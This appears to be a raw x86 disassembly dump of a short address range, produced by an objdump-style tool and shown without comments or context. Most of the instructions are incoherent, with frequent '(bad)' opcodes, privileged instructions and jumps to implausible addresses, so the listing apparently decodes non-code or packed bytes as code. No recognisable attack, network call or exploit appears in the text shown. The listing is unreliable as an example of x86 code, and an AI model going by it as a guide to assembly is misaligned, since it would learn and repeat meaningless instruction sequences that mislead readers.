  432c54:	leave  
  432c55:	xor    ecx,DWORD PTR [eax]
  432c57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432c5d:	add    ah,al
  432c5f:	xor    edi,edi
  432c61:	xor    DWORD PTR [ebx],0x66003302
  432c67:	mov    DWORD PTR [ebp-0xc],ecx
  432c6a:	pcmpgtw mm0,mm0
  432c6d:	add    dl,ah
  432c6f:	leave  
  432c70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c74:	push   eax
  432c75:	dec    ebp
  432c76:	mov    esi,DWORD PTR [ebx-0x75]
  432c79:	lea    ebp,[eax-0x7c00ff02]
  432c7f:	xor    eax,DWORD PTR [eax]
  432c81:	sysret 
  432c83:	dec    ebp
  432c84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c8b:	push   WORD PTR [ecx+0x8]
  432c8f:	jne    0x432c52
  432c91:	ud0    ecx,DWORD PTR [ecx]
  432c94:	mov    eax,edx
  432c96:	lods   al,BYTE PTR ds:[esi]
  432c97:	add    BYTE PTR [eax],al
  432c99:	data16 (bad) 
  432c9b:	iret   
  432c9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ca3:	cli    
  432ca4:	inc    ebp
  432ca5:	cmp    al,0x8d
  432ca7:	add    BYTE PTR [esi+0x2d],ah
  432caa:	inc    ebp
  432cab:	pop    ebp
  432cac:	lea    ecx,[edi]
  432cae:	mov    dl,bh
  432cb0:	add    BYTE PTR [edi],cl
  432cb2:	mov    DWORD PTR [eax+eax*8],edi
  432cb5:	mov    ebx,0x3b87
  432cba:	add    BYTE PTR [ebx],ch
  432cbc:	inc    ebp
  432cbd:	data16 (bad) 
  432cbf:	clc    
  432cc0:	int3   
  432cc1:	cmp    eax,DWORD PTR [eax]
  432cc3:	je     0x432c4e
  432cc5:	push   0xffffffc8
  432cc7:	pop    edi
  432cc8:	xchg   DWORD PTR [ebp+0x0],eax
  432ccb:	data16 add BYTE PTR [ebp+0x45],cl
  432ccf:	lea    cx,[ebp+0x10]
  432cd3:	jb     0x432cd5
  432cd5:	jmp    0x432c60
  432cd7:	call   eax
  432cd9:	clc    
  432cda:	xchg   DWORD PTR [edi+0x1],edi
  432cdd:	mov    eax,DWORD PTR [eax]
  432cdf:	or     BYTE PTR [ebp-0x49],al
  432ce2:	lea    eax,[eax+0x74003154]
  432ce8:	push   edi
  432ce9:	inc    edx
  432cea:	jge    0x432ceb
  432cec:	mov    DWORD PTR [edi],ecx
  432cee:	fdiv   DWORD PTR [edi-0x6]
  432cf1:	inc    DWORD PTR [eax]
  432cf3:	xor    edx,DWORD PTR [eax+0x5f]
  432cf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432cf9:	ret    0x0
  432cfc:	xor    BYTE PTR [ebp-0x51],cl
  432cff:	cmp    edi,0xf0ff89fe
  432d05:	data16 ror al,0x84
  432d09:	rol    BYTE PTR [eax],0x3b
  432d0c:	add    al,dh
  432d0e:	dec    eax
  432d0f:	xchg   esp,eax
  432d10:	push   ebx
  432d11:	jmp    0x432c9e
  432d13:	push   ebp
  432d14:	add    esp,ebp
  432d16:	add    ebp,esp
  432d18:	mov    edx,DWORD PTR [edi+0x24]
  432d1b:	clc    
  432d1c:	dec    esi
  432d1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432d23:	cmp    BYTE PTR [ebx],al
  432d25:	jne    0x432cb0
  432d27:	xor    esp,eax
  432d29:	jmp    0x462eac
  432d2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432d31:	jne    0x432d27
  432d33:	call   0xffcd2a8d
  432d38:	clc    
  432d39:	xchg   edi,eax
  432d3a:	sti    
  432d3b:	add    DWORD PTR [ebx],eax
  432d3d:	add    BYTE PTR [ebp+0x47],bl
  432d40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432d46:	pop    ebp
  432d47:	mov    DWORD PTR [esi-0x48],esi
  432d4a:	jmp    0x432d93
  432d4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432d52:	(bad)  
  432d54:	cmp    al,0x0
  432d56:	cmp    eax,DWORD PTR [ebp+0x18]
  432d59:	lea    ebx,[ebp-0x56]
  432d5c:	jle    0x432d5e
  432d5e:	jae    0x432ce9
  432d60:	mov    eax,esp
  432d62:	call   0xb900:0x8b005587
  432d69:	inc    ebp
  432d6a:	push   ebp
  432d6b:	lea    ecx,[ebp-0x27ff4f12]
  432d71:	mov    eax,edi
  432d73:	int3   
  432d74:	push   ebp
  432d75:	xchg   edi,eax
  432d77:	add    esp,ebp
  432d79:	add    BYTE PTR [eax],al
  432d7b:	inc    ebp
  432d7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432d82:	cld    
  432d83:	mov    DWORD PTR [edx],edi
  432d85:	aam    0x75
  432d87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d8d:	mov    DWORD PTR [ebx-0x50],edx
  432d90:	test   BYTE PTR [ebp-0x1],0xe8
  432d94:	mov    eax,DWORD PTR [eax]
  432d96:	hlt    
  432d97:	add    al,al
  432d99:	mov    eax,DWORD PTR ds:0x890045a8
  432d9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432da5:	inc    DWORD PTR [eax*2+0xf75854d]
  432dac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432db2:	call   0x72998af3
  432db7:	je     0x432e17
  432db9:	js     0x432e1a
  432dbb:	lock ret 0x7e
  432dbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432dc5:	mov    edi,edi
  432dc7:	sbb    al,bl
  432dc9:	clc    
  432dca:	add    BYTE PTR [ebp-0x73],bh
  432dcd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432dd3:	ror    BYTE PTR [eax],1
  432dd5:	dec    ebp
  432dd6:	xchg   ebp,eax
  432dd7:	mov    edi,edi
  432dd9:	in     al,0x8b
  432ddb:	jge    0x432d66
  432ddd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432de3:	clc    
  432de4:	pop    esi
  432de5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432deb:	clc    
  432dec:	add    al,0x6e
  432dee:	mov    eax,DWORD PTR [ebx]
  432df0:	mov    BYTE PTR [ebp+0x0],dl
  432df3:	mov    edx,DWORD PTR [ebx-0x20]
  432df6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432dfc:	add    eax,0x3b3b73
  432e01:	adc    al,0x89
  432e03:	pop    eax
  432e04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432e08:	ret    0xf08
  432e0b:	cmp    al,0x2
  432e0d:	mov    edx,eax
  432e0f:	cld    
  432e10:	add    BYTE PTR [ebp+0x66],dl
  432e13:	add    eax,ebx
  432e15:	add    esp,eax
  432e17:	sub    eax,eax
  432e19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432e1f:	add    BYTE PTR [eax],al
  432e21:	mov    DWORD PTR [ebx-0x24],ebx
  432e24:	push   edi
  432e25:	push   ebp
  432e26:	clc    
  432e27:	add    DWORD PTR [esi+0x1b0100],0x45
  432e2e:	out    0xff,eax
  432e30:	add    edx,DWORD PTR [eax]
  432e32:	jmp    0x432e1c
  432e34:	cmp    ch,0x46
  432e37:	(bad)  
  432e38:	jmp    0x40c8b68a
  432e3d:	je     0x432dc9
  432e3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432e45:	inc    ebp
  432e46:	add    BYTE PTR [ebx-0x770375],al
  432e4c:	add    ah,ch
  432e4e:	add    edx,esp
  432e50:	pop    edi
  432e51:	pop    ebp
  432e52:	push   ebp
  432e53:	inc    ebx
  432e54:	in     al,dx
  432e55:	pop    ebp
  432e56:	in     al,dx
  432e57:	cmp    edx,DWORD PTR [edi-0x8]
  432e5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432e61:	add    al,0x47
  432e63:	push   ebp
  432e64:	mov    esp,ebp
  432e66:	in     al,0x45
  432e68:	dec    ebp
  432e69:	push   esi
  432e6a:	test   DWORD PTR [eax+0xfb010f],esi
  432e70:	add    BYTE PTR [eax+0xc018b],dh
  432e76:	leave  
  432e77:	inc    ebp
  432e78:	test   al,ch
  432e7a:	add    dh,bh
  432e7c:	add    bh,bh
  432e7e:	dec    ebp
  432e7f:	push   cs
  432e80:	mov    DWORD PTR [ecx],eax
  432e82:	hlt    
  432e83:	push   es
  432e84:	dec    ebp
  432e85:	leave  
  432e86:	mov    DWORD PTR [eax],ecx
  432e88:	clc    
  432e89:	cmovge eax,ecx
  432e8c:	mov    ecx,0x85c2f0
  432e92:	clc    
  432e93:	pop    DWORD PTR [ebp+0x1]
  432e96:	push   ebx
  432e97:	add    BYTE PTR [ebp-0x15],bh
  432e9a:	push   esi
  432e9b:	xor    eax,0x898a45
  432ea0:	cld    
  432ea1:	add    al,BYTE PTR [ebp+0x0]
  432ea4:	xor    esp,DWORD PTR [esi-0x64]
  432ea7:	add    DWORD PTR [esi+0x78308c1],edi
  432ead:	add    ah,BYTE PTR [ebp-0x49]
  432eb0:	int    0xbb
  432eb2:	mov    ecx,DWORD PTR [esi+0xc]
  432eb5:	add    dh,al
  432eb7:	cmp    ecx,ebx
  432eb9:	jne    0x432e83
  432ebb:	xor    ecx,DWORD PTR [ebp+0x66]
  432ebe:	jmp    0xca2ec4
  432ec3:	add    DWORD PTR [ebp+0x0],eax
  432ec6:	mov    eax,ebx
  432ec8:	or     al,0x8b
  432eca:	(bad)  
  432ecb:	mov    ecx,esi
  432ecd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432ed4:	mov    eax,edi
  432ed6:	or     BYTE PTR [edx],cl
  432ed8:	shl    cl,cl
  432eda:	icebp  
  432edb:	add    BYTE PTR [ebp+0x38],0x8b
  432edf:	or     BYTE PTR [edx+eax*2],cl
  432ee2:	(bad)  
  432ee3:	or     cl,dh
  432ee5:	stc    
  432ee6:	shl    DWORD PTR [ebp-0x30],0xc6
  432eea:	xor    al,0x0
  432eec:	inc    ebp
  432eed:	xchg   BYTE PTR [ebx],al
  432eef:	add    esp,edi
  432ef1:	add    BYTE PTR [ebp-0x39],cl
  432ef4:	mov    al,bl
  432ef6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432efc:	sub    al,0xbf
  432efe:	jmp    0x432e85
  432f00:	mov    edi,eax
  432f02:	lock jge 0x432ef6
  432f05:	lea    esi,[edx-0x74bad5ff]
  432f0b:	mov    ebp,esp
  432f0d:	or     cl,dh
  432f0f:	leave  
  432f10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432f17:	dec    ebp
  432f18:	dec    ebp
  432f19:	test   DWORD PTR [ebx],eax
  432f1b:	paddb  mm6,mm0
  432f1e:	add    DWORD PTR [eax],eax
  432f20:	dec    ebp
  432f21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432f27:	mov    esi,DWORD PTR [edx]
  432f29:	or     al,0x2b
  432f2b:	dec    ebp
  432f2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432f32:	mov    esp,edi
  432f34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432f3b:	mov    DWORD PTR [ebx],ebp
  432f3d:	call   0xc76b86d
  432f42:	mov    DWORD PTR [ebp+0x10],ecx
  432f45:	(bad)  
  432f46:	push   0x8b85ff10
  432f4b:	clc    
  432f4c:	or     al,0x54
  432f4e:	(bad)  
  432f4f:	push   ecx
  432f50:	retf   
  432f51:	mov    ebx,0xff4d8dc8
  432f56:	mov    DWORD PTR [ebp+0x8],eax
  432f59:	xor    eax,DWORD PTR [ebp-0x75]
  432f5c:	cmp    ebp,DWORD PTR [ebx]
  432f5e:	lsl    ebx,WORD PTR [edi-0x8]
  432f62:	call   DWORD PTR [ebx-0x741bff75]
  432f68:	(bad)  
  432f69:	or     al,0x5b
  432f6b:	dec    ebp
  432f6c:	or     BYTE PTR [ebx],dh
  432f6e:	inc    ebp
  432f6f:	xor    esi,DWORD PTR ds:0x708088d
  432f75:	in     eax,0x9b
  432f77:	add    BYTE PTR [edx],dh
  432f79:	inc    ebp
  432f7a:	pop    edi
  432f7b:	xor    eax,edx
  432f7d:	test   DWORD PTR [eax],0x81108b8b
  432f83:	dec    ebp
  432f84:	sub    al,0x33
  432f86:	add    BYTE PTR [ebx],dh
  432f88:	push   esi
  432f89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f8f:	mov    edi,eax
  432f91:	or     BYTE PTR [ebp+0x45],al
  432f94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f9a:	xor    ecx,ecx
  432f9c:	pushf  
  432f9d:	push   es
  432f9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432fa5:	dec    ebp
  432fa6:	inc    ebp
  432fa7:	cmp    BYTE PTR [ecx],0x54
  432faa:	pushf  
  432fab:	gs (bad) 
  432fad:	shl    esp,1
  432faf:	dec    ebp
  432fb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432fb6:	shr    ecx,1
  432fb8:	xlat   BYTE PTR ds:[ebx]
  432fb9:	rol    bh,cl
  432fbb:	mov    edx,esp
  432fbd:	or     BYTE PTR [ebp+0x4588f84d],al
  432fc3:	mov    ecx,DWORD PTR [eax]
  432fc5:	or     BYTE PTR [eax],al
  432fc7:	push   ebp
  432fc8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432fce:	dec    ebp
  432fcf:	enter  0xceba,0x8
  432fd3:	retf   0x1807
  432fd6:	ret    0x9b4d
  432fd9:	mov    esi,DWORD PTR [edx]
  432fdb:	or     al,0x33
  432fdd:	into   
  432fde:	add    edx,esi
  432fe0:	add    ecx,edx
  432fe2:	bswap  eax
  432fe4:	ror    esi,0x98
  432fe7:	dec    ebp
  432fe8:	add    cl,ch
  432fea:	mov    edi,edi
  432fec:	hlt    
  432fed:	inc    esi
  432fef:	inc    ebp
  432ff0:	ret    0x4533
  432ff3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ff9:	or     BYTE PTR [ebx],dh
  432ffb:	dec    ebp
  432ffc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433002:	jne    0xff8d2fc9
  433008:	inc    ebp
  433009:	inc    ebp
  43300a:	mov    esi,DWORD PTR [ebx]
  43300c:	clc    
  43300d:	pop    esi
  43300e:	ret    0xcaeb
  433011:	mov    eax,esi
  433013:	call   0x520484e6
  433018:	dec    ebp
  433019:	add    eax,0xf8728b
  43301e:	adc    eax,0xce0ccac9
  433023:	push   ebp
  433024:	ret    0xc6ec
  433027:	in     al,dx
  433028:	call   0x33437d31
  43302d:	push   edi
  43302e:	add    edi,eax
  433030:	xor    eax,eax
  433032:	jmp    0x433079
  433034:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  43303a:	add    eax,edi
  43303c:	shr    eax,cl
  43303e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433044:	mov    esi,DWORD PTR [edx]
  433046:	in     al,dx
  433047:	pushf  
  433048:	ret    0x84c7
  43304b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  433051:	inc    ebp
  433052:	in     al,dx
  433053:	xor    DWORD PTR [ebp-0x64],eax
  433056:	mov    eax,edi
  433058:	cld    
  433059:	fmul   st(2),st
  43305b:	sbb    dl,al
  43305d:	jmp    0x9c3b:0x304d45c1
  433064:	jbe    0x43302d
  433066:	mov    esp,eax
  433068:	clc    
  433069:	add    BYTE PTR [ebp+0x0],cl
  43306c:	mov    ecx,ecx
  43306e:	lea    eax,[ebp-0x5]
  433071:	mov    edi,edi
  433073:	call   0x51ce84bd
  433078:	hlt    
  433079:	xor    eax,edx
  43307b:	mov    esi,0x9b7284
  433080:	xor    cl,dl
  433082:	mov    esi,eax
  433084:	hlt    
  433085:	into   
  433086:	inc    ebp
  433087:	scas   eax,DWORD PTR es:[edi]
  433088:	mov    ebp,ecx
  43308a:	cld    
  43308b:	add    dl,cl
  43308d:	add    dl,al
  43308f:	inc    ebp
  433090:	shr    DWORD PTR [ebx],0x4d
  433093:	xor    edi,DWORD PTR [ebx]
  433095:	mov    DWORD PTR [edi],ecx
  433097:	clc    
  433098:	dec    esi
  433099:	inc    ebp
  43309a:	dec    DWORD PTR [ebx-0x3d2b1775]
  4330a0:	ret    0xc6ca
  4330a3:	mov    BYTE PTR [ebp-0x32],0x53
  4330a7:	scas   eax,DWORD PTR es:[edi]
  4330a8:	inc    ebp
  4330a9:	jmp    0x4330db
  4330ab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  4330b2:	pop    ebx
  4330b3:	xor    ecx,DWORD PTR [ebp+0x3]
  4330b6:	mov    eax,DWORD PTR [ebx]
  4330b8:	clc    
  4330b9:	test   edx,ecx
  4330bb:	mov    ecx,esi
  4330bd:	cld    
  4330be:	call   0x8ab77608
  4330c3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  4330c9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  4330cf:	fdiv   QWORD PTR [ebx]
  4330d1:	retf   0xce89
  4330d4:	in     al,0xc1
  4330d6:	inc    ebp
  4330d7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  4330dd:	into   
  4330de:	mov    dh,0xc1
  4330e1:	call   0x8c17766a
  4330e6:	(bad)  
  4330e7:	cld    
  4330e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4330eb:	xor    eax,ecx
  4330ed:	lea    eax,[ebp+0x8]
  4330f0:	mov    esi,DWORD PTR [edx-0x4]
  4330f3:	add    dl,al
  4330f5:	inc    ebp
  4330f6:	mov    esp,0x32d89b8b
  4330fb:	dec    ebp
  4330fc:	mov    esi,DWORD PTR [ebx]
  4330fe:	cld    
  4330ff:	xor    eax,edx
  433101:	sub    esp,DWORD PTR [ebp-0x75]
  433104:	int    0xec
  433106:	sub    ecx,eax
  433108:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43310e:	mov    esi,esp
  433110:	call   0x34177e99
  433115:	inc    DWORD PTR [ebx]
  433117:	mov    edi,DWORD PTR [ebx]
  433119:	cld    
  43311a:	jne    0x433169
  43311c:	mov    esi,DWORD PTR [ebx]
  43311e:	aam    0x8d
  433120:	dec    ebp
  433121:	or     BYTE PTR [ebx],dh
  433123:	jb     0x433128
  433125:	add    BYTE PTR [edi+0x45],bl
  433128:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43312f:	xor    ebp,esp
  433131:	xor    eax,edi
  433133:	sub    edi,esp
  433135:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43313b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433142:	inc    ebp
  433143:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433149:	clc    
  43314a:	mov    eax,edi
  43314c:	nop
  43314d:	fadd   QWORD PTR [eax]
  43314f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433155:	jmp    0x4330e0
  433157:	mov    eax,DWORD PTR [ecx]
  433159:	fadd   DWORD PTR [eax]
  43315b:	inc    ebp
  43315c:	or     DWORD PTR [ebx],esi
  43315e:	dec    eax
  43315f:	add    edx,DWORD PTR [ebx-0x2d]
  433162:	dec    ebp
  433163:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433169:	inc    ebp
  43316a:	push   esp
  43316b:	mov    dl,BYTE PTR [ecx-0xd]
  43316e:	xor    ecx,DWORD PTR [ebp-0x45]
  433171:	(bad)  
  433173:	rol    BYTE PTR [eax],0xc1
  433176:	ret    
  433177:	inc    ebp
  433178:	inc    ebp
  433179:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43317f:	xor    eax,ebx
  433181:	add    eax,DWORD PTR [ebp+0x23]
  433184:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43318a:	cmp    edi,0xc
  43318d:	dec    ebp
  43318e:	inc    ebp
  43318f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433195:	inc    ebp
  433196:	mov    esi,DWORD PTR [ebx]
  433198:	clc    
  433199:	lea    eax,[ebp+0x45725407]
  43319f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4331a3:	xor    edi,DWORD PTR [eax]
  4331a5:	mov    ecx,0xff8b8d4d
  4331aa:	push   esp
  4331ab:	enter  0x4df7,0x23
  4331af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4331b5:	mov    eax,DWORD PTR [ebx]
  4331b7:	loopne 0x4331a4
  4331b9:	ret    0xc68b
  4331bc:	push   esp
  4331bd:	enter  0x9745,0x8b
  4331c1:	inc    ebp
  4331c2:	cld    
  4331c3:	mov    eax,edi
  4331c5:	clc    
  4331c6:	ret    
  4331c7:	ret    0xc645
  4331ca:	mov    esi,DWORD PTR [ebx]
  4331cc:	cld    
  4331cd:	pop    esi
  4331ce:	mov    ebx,0x83458bc3
  4331d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4331d8:	dec    ebp
  4331d9:	xor    DWORD PTR [ebx],esi
  4331db:	pushf  
  4331dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4331e2:	fcom   DWORD PTR [ebp+0x45]
  4331e5:	mov    esi,DWORD PTR [ebx]
  4331e7:	adc    al,0x9c
  4331e9:	inc    ebp
  4331ea:	(bad)  
  4331eb:	mov    ebx,eax
  4331ed:	adc    al,0x85
  4331ef:	cmp    al,0x1
  4331f2:	inc    ebp
  4331f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4331f9:	mov    eax,DWORD PTR [ebx]
  4331fb:	nop
  4331fc:	add    BYTE PTR [eax],al
  4331fe:	inc    ebp
  4331ff:	mov    esi,DWORD PTR [ebx]
  433201:	add    eax,DWORD PTR [ebx]
  433203:	cmp    al,0x89
  433205:	mov    esp,esi
  433207:	clc    
  433208:	inc    ebp
  433209:	inc    ebp
  43320a:	add    edx,DWORD PTR [esi+0xc]
  43320d:	mov    edi,0x7ff0845
  433212:	in     al,dx
  433213:	(bad)  
  433214:	jne    0x4331b1
  433216:	mov    esi,DWORD PTR [edx]
  433218:	clc    
  433219:	add    ebp,DWORD PTR [esi]
  43321b:	mov    edi,edi
  43321d:	in     al,dx
  43321e:	mov    DWORD PTR [ebp-0x10],eax
  433221:	xor    eax,DWORD PTR [ebp+0x3]
  433224:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43322a:	fmul   DWORD PTR [ebx-0x173caf39]
  433230:	lea    ecx,[ecx+0x45e8d4bc]
  433236:	clc    
  433237:	mov    edi,edi
  433239:	cmp    BYTE PTR [ebp+0x4d],al
  43323c:	test   DWORD PTR [eax+0x74],ecx
  43323f:	inc    ecx
  433240:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433246:	ret    
  433247:	inc    eax
  433248:	dec    DWORD PTR [ebx+0x4945f8f0]
  43324e:	push   eax
  43324f:	dec    eax
  433250:	test   al,0xd0
  433252:	dec    eax
  433254:	mov    eax,DWORD PTR [ebp-0x14]
  433257:	mov    eax,DWORD PTR [ebp+0x38]
  43325a:	mov    eax,ecx
  43325c:	fadd   DWORD PTR [ebx]
  43325e:	dec    ebp
  43325f:	inc    eax
  433260:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433266:	inc    ebp
  433267:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43326d:	fadd   QWORD PTR [ebx]
  43326f:	inc    ebp
  433270:	or     al,0x33
  433272:	dec    ebp
  433273:	add    edi,DWORD PTR [ebx]
  433275:	mov    DWORD PTR [edx-0x28],esi
  433278:	mov    eax,DWORD PTR [ebp-0x10]
  43327b:	mov    eax,DWORD PTR [eax+0x10]
  43327e:	mov    eax,edi
  433280:	lock ret 
  433282:	inc    ecx
  433283:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433289:	fsubr  st,st(5)
  43328b:	test   DWORD PTR [eax],eax
  43328d:	clc    
  43328e:	push   0x45
  433290:	(bad)  
  433291:	cmp    al,0xec
  433293:	pushf  
  433294:	inc    ebp
  433295:	(bad)  
  433296:	push   eax
  433297:	fsub   DWORD PTR [eax-0x7b]
  43329a:	(bad)  
  43329b:	clc    
  43329c:	mov    eax,0xf8008584
  4332a1:	mov    eax,DWORD PTR [ebp-0x4]
  4332a4:	mov    edi,0x4585c3cc
  4332aa:	clc    
  4332ab:	mov    eax,DWORD PTR [ebp+0x14]
  4332ae:	xor    eax,DWORD PTR [ebp-0x64]
  4332b1:	mov    edi,eax
  4332b3:	in     al,dx
  4332b4:	les    esi,FWORD PTR [ebp-0x7b]
  4332b7:	mov    edi,eax
  4332b9:	or     al,0x4d
  4332bb:	dec    ebp
  4332bc:	mov    eax,ebp
  4332be:	in     al,0xf2
  4332c0:	dec    ebp
  4332c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4332c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4332cd:	inc    ebp
  4332ce:	mov    DWORD PTR [ebx],esi
  4332d0:	fadd   QWORD PTR [ebx]
  4332d2:	dec    ebp
  4332d3:	push   eax
  4332d4:	xor    eax,DWORD PTR [ebp+0x3]
  4332d7:	push   eax
  4332d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4332db:	push   esi
  4332dd:	mov    eax,DWORD PTR [eax]
  4332df:	lock cmp eax,0xf84e85c0
  4332e5:	inc    ebp
  4332e6:	test   BYTE PTR [ebx],dh
  4332e8:	add    DWORD PTR [ebx],eax
  4332ea:	add    BYTE PTR [eax+0x4d],dl
  4332ed:	jne    0x433322
  4332ef:	lea    ecx,[ebx-0x7617fc44]
  4332f5:	div    ah
  4332f7:	inc    DWORD PTR [ebp+0x45]
  4332fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433300:	jb     0x43328d
  433302:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433309:	mov    ecx,DWORD PTR [ebp-0x10]
  43330c:	xor    ecx,DWORD PTR [ebp+0x3]
  43330f:	mov    edi,DWORD PTR [ebx]
  433311:	adc    BYTE PTR [ebp+0x41],dh
  433314:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43331a:	ret    
  43331b:	push   ss
  43331c:	push   0x45
  43331e:	lea    ecx,[ebx+0x4de80cb0]
  433324:	sti    
  433325:	add    edi,edi
  433327:	or     BYTE PTR [ebp+0x4d],al
  43332a:	mov    ebp,DWORD PTR [ebx]
  43332c:	xor    ebp,ecx
  43332e:	mov    al,BYTE PTR [edx]
  433330:	add    eax,0xc7200
  433335:	jne    0x433384
  433337:	lea    esi,[ebx]
  433339:	mov    al,0xf
  43333b:	call   0xf2a00
  433340:	shl    DWORD PTR [ecx],0x84
  433343:	pushf  
  433344:	add    DWORD PTR [ecx+0x4545d000],ecx
  43334a:	mov    esi,DWORD PTR [edx]
  43334c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433353:	test   DWORD PTR [eax],eax
  433355:	clc    
  433356:	dec    ebp
  433357:	inc    ebp
  433358:	xor    edi,DWORD PTR [edi+ecx*1]
  43335b:	pushf  
  43335c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433363:	lea    eax,[ecx]
  433365:	int3   
  433366:	add    BYTE PTR [ebp+0x45],cl
  433369:	lea    ecx,[ebx-0x75b2cc38]
  43336f:	lea    eax,ds:0x4d72c4
  433375:	mov    ecx,DWORD PTR [ebp-0x4]
  433378:	xor    ecx,edi
  43337a:	bswap  ebx
  43337c:	ror    BYTE PTR [ebp-0x35],0xe9
  433380:	rol    DWORD PTR [ecx],0x84
  433383:	add    BYTE PTR [ecx],al
  433385:	xor    eax,DWORD PTR [eax]
  433387:	pushf  
  433388:	inc    ebp
  433389:	jnp    0x8a43678c
  43338f:	mov    eax,DWORD PTR ds:0xcf72e8
  433395:	lock dec ebp
  433397:	retf   
  433398:	xor    ecx,DWORD PTR [ebp+0xf]
  43339b:	mov    eax,eax
  43339d:	fmul   st,st(3)
  43339f:	test   ecx,0x19b8484
  4333a5:	xor    al,BYTE PTR [eax]
  4333a7:	mov    DWORD PTR [ebp-0x28],eax
  4333aa:	mov    eax,DWORD PTR [ebp+0x33]
  4333ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4333b3:	ret    
  4333b4:	add    al,cl
  4333b6:	dec    ebp
  4333b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4333bd:	add    ecx,DWORD PTR ds:0xc7250
  4333c3:	inc    ebp
  4333c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4333c8:	mov    edi,edi
  4333ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4333d0:	jb     0x433399
  4333d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4333d9:	mov    esi,DWORD PTR [ebx]
  4333db:	cld    
  4333dc:	mov    cl,bh
  4333de:	or     eax,0x372b6
  4333e3:	cmp    ecx,eax
  4333e5:	jne    0x433462
  4333eb:	mov    eax,DWORD PTR [ebp-0x20]
  4333ee:	mov    eax,DWORD PTR [eax]
  4333f0:	xor    eax,edi
  4333f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4333f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4333fc:	mov    ecx,edi
  4333fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433404:	jb     0x433415
  433406:	add    BYTE PTR [edi-0x3f],dl
  433409:	add    BYTE PTR [ebp-0x75],cl
  43340c:	mov    esi,eax
  43340e:	xor    eax,DWORD PTR [eax]
  433410:	mov    al,bh
  433412:	or     eax,0x4b7284
  433417:	xor    al,cl
  433419:	mov    ecx,DWORD PTR [ebp-0x4]
  43341c:	mov    ecx,edi
  43341e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433424:	jb     0x433435
  433426:	add    BYTE PTR [edi],dh
  433428:	enter  0x8500,0x8b
  43342c:	add    ah,bl
  43342e:	add    BYTE PTR [eax],al
  433430:	inc    ebp
  433431:	(bad)  
